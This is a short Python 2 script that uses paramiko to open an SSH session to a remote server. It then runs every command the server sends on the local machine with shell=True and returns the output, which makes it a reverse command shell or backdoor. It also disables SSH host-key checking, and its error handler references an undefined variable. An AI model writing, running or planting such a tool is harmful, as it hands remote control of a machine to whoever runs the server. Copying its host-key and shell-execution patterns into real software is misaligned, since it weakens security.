import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    # client.load_host_keys('/path/to/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username = user, password = passwd)
    
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.send(command)
        # Read banner
        print ssh_session.recv(1024) 
        
        while True:
            # Get the command from the SSH Server
            command = ssh_session.recv(1024) 
            try:
                cmd_output = subprocess.check_output(command, shell = True)
                ssh_session.send(cmd_output)
            except:
                ssh_session.send(str(e))

        client.close()
    return

ssh_command('some_ip', 'some_user', 'some_password', 'some_command')